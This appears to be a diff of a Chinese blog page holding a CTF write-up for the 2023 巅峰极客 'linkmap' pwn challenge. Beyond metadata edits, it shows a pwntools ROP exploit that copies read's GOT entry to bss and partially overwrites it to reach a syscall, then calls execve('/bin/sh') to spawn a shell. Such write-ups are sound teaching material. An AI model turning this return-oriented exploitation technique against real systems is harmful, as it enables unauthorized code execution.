@@ -129,15 +129,13 @@
 
 
 
-<meta name="description" content="Pwnlinkmap一眼题目以为是ret2dlresolve，看了保护发现开了Full RELRO，直接自闭，看了Ex师傅的脚本才发现一段神奇的汇编，可以把got中的地址写到bss上，然后我是把read的got写到bss上，然后改成syscall的地址，最后调用execve。我后来想了想，硬要说这个汇编是怎么找到的，一来IDA中bss上有地址量unk_601020的显示，交叉引用能够找到，二来就是">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2023 巅峰极客">
 <meta property="og:url" content="https://pursuezhou.github.io/2023/07/23/CTF/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/index.html">
 <meta property="og:site_name" content="Pursue">
-<meta property="og:description" content="Pwnlinkmap一眼题目以为是ret2dlresolve，看了保护发现开了Full RELRO，直接自闭，看了Ex师傅的脚本才发现一段神奇的汇编，可以把got中的地址写到bss上，然后我是把read的got写到bss上，然后改成syscall的地址，最后调用execve。我后来想了想，硬要说这个汇编是怎么找到的，一来IDA中bss上有地址量unk_601020的显示，交叉引用能够找到，二来就是">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-07-22T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-03-13T12:08:16.755Z">
+<meta property="article:modified_time" content="2024-03-14T02:01:57.283Z">
 <meta property="article:author" content="Pursue">
 <meta property="article:tag" content="巅峰极客">
 <meta name="twitter:card" content="summary">
@@ -427,8 +425,6 @@
 
       
         <h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h3><p>一眼题目以为是ret2dlresolve，看了保护发现开了<code>Full RELRO</code>，直接自闭，看了Ex师傅的脚本才发现一段神奇的汇编，可以把got中的地址写到bss上，然后我是把read的got写到bss上，然后改成<code>syscall</code>的地址，最后调用execve。我后来想了想，硬要说这个汇编是怎么找到的，一来IDA中bss上有地址量<code>unk_601020</code>的显示，交叉引用能够找到，二来就是凭借经验了。</p>
-<span id="more"></span>
-
 <p>EXP如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&quot;./ezzzz&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ezzzz&quot;</span>)</span><br><span class="line">libc = sh.libc</span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x00000000004007e3</span></span><br><span class="line">p_rsi_r15_r = <span class="number">0x00000000004007e1</span></span><br><span class="line">p_rbp_r = <span class="number">0x0000000000400570</span></span><br><span class="line">leave_ret = <span class="number">0x000000000400772</span></span><br><span class="line">magic = <span class="number">0x000000000040066b</span>          <span class="comment"># lea rdx,[rax+0x601020];mov rax,[rbp-8];mov [rdx],rax;nop;pop rbp;ret</span></span><br><span class="line"></span><br><span class="line">pld = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span>,</span><br><span class="line">    p_rbp_r, elf.got[<span class="string">&#x27;read&#x27;</span>] + <span class="number">8</span>,</span><br><span class="line">    p_rdi_r, <span class="number">0</span>,</span><br><span class="line">    p_rsi_r15_r, <span class="number">0x601020</span>, <span class="number">0</span>,</span><br><span class="line">    elf.plt[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">    magic, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    p_rdi_r, <span class="number">0</span>,</span><br><span class="line">    p_rsi_r15_r, <span class="number">0x601020</span> + <span class="number">0x100</span> - <span class="number">58</span>, <span class="number">0</span>,</span><br><span class="line">    elf.plt[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">    p_rdi_r, <span class="number">0x601020</span>,</span><br><span class="line">    p_rsi_r15_r, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    p_rbp_r, <span class="number">0x601020</span> + <span class="number">0x100</span> - <span class="number">8</span>,</span><br><span class="line">    leave_ret</span><br><span class="line">    )</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span> * <span class="number">58</span> + <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -576,7 +572,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
